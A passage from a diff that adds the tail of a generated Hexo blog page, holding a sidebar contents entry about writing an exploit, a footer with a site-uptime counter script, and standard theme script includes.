class="nav-number">3.2.</span> <span class="nav-text">2.编写exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HC</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<br>
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span><br>  Sometimes your whole life boils down to one insane move.
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("09/12/2019 00:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已修炼 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
